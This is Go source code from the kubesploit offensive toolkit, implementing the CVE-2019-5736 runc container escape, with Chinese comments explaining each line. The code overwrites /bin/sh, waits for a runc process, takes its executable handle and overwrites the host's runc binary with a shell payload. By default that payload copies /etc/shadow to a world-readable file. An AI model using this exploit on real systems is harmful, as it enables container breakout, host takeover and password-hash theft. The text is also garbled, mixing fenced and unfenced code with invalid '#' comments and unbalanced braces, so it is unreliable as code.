# `kubesploit\data\modules\sourcecode\go\CVE-2019-5736\main.go`

```
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d

import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
//var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"

func mainfunc(payload string){
```

注释：
- `package main`：声明这个文件属于main包
- `// Implementation of CVE-2019-5736`：说明这段代码是对CVE-2019-5736的实现
- `// Created with help from @singe, @_cablethief, and @feexd.`：感谢@singe、@_cablethief和@feexd的帮助
- `// This commit also helped a ton to understand the vuln`：这个提交也帮助了很多理解这个漏洞
- `// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d`：提供了一个链接，指向帮助理解漏洞的提交
- `import (`：引入需要的包
- `func mainfunc(payload string){`：定义了一个名为mainfunc的函数，参数为payload字符串
- `var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"`：这是一个注释掉的shell命令，将会在主机上执行
// 如果 payload 为空，则设置默认的 payload 为一个读取 /etc/shadow 文件内容并保存到 /tmp/shadow 的命令
// 如果 payload 不为空，则去除首尾空白字符，并在其前面加上 #!/bin/bash \n
if payload == "" {
    payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
} else {
    payload = strings.TrimSpace(payload)
    payload = "#!/bin/bash \n" + payload
}

// 首先用 /proc/self/exe 的解释器路径覆盖 /bin/sh
// 创建 /bin/sh 文件并写入 #!/proc/self/exe
fd, err := os.Create("/bin/sh")
if err != nil {
    fmt.Println(err)
    return
}
fmt.Fprintln(fd, "#!/proc/self/exe")
err = fd.Close()
if err != nil {
    fmt.Println(err)
    return
}
fmt.Println("[+] Overwritten /bin/sh successfully")
	// 打印提示信息，告知用户正在运行 CVE-2019-5736 的利用程序，建议使用 "docker exec" 命令进入容器
	fmt.Println("[*] Exploit for CVE-2019-5736 is running, try \"docker exec\" to the container")
	// 循环遍历所有进程，查找包含 runcinit 的命令行的进程
	// 这将是由 runc 创建的进程
	var found int
	for found == 0 {
		// 读取 /proc 目录下的所有文件，获取进程 ID
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		// 遍历进程 ID
		for _, f := range pids {
			// 读取进程的命令行内容
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			// 如果命令行包含 "runc"，则打印找到的进程 ID
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				// 将找到的进程 ID 转换为整数类型
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
	}
	}
	}

	// 使用进程ID获取runc在主机上的文件句柄
	var handleFd = -1
	for handleFd == -1 {
		// 注意，你不需要使用O_PATH标志来使漏洞利用工作
		// 打开进程的可执行文件，获取文件句柄
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		// 如果文件句柄大于0，则表示成功获取文件句柄
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	// 打印成功获取文件句柄的消息
	fmt.Println("[+] Successfully got the file handle")

	// 现在我们有了文件句柄，让我们写入runc二进制文件并覆盖它
	// 它将保持可执行标志
	for {
		// 打开文件句柄，准备写入
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		// 如果文件句柄大于0，则表示成功打开文件句柄
		if int(writeHandle.Fd()) > 0 {
# 打印成功获取写入句柄的消息
fmt.Println("[+] Successfully got write handle", writeHandle)
# 将 payload 写入到 writeHandle 中
writeHandle.Write([]byte(payload))
# 返回
return
# 注释掉的代码段，定义了一个名为 main 的函数，其中包含了一个名为 payload 的变量，以及一个调用 mainfunc 函数的注释
```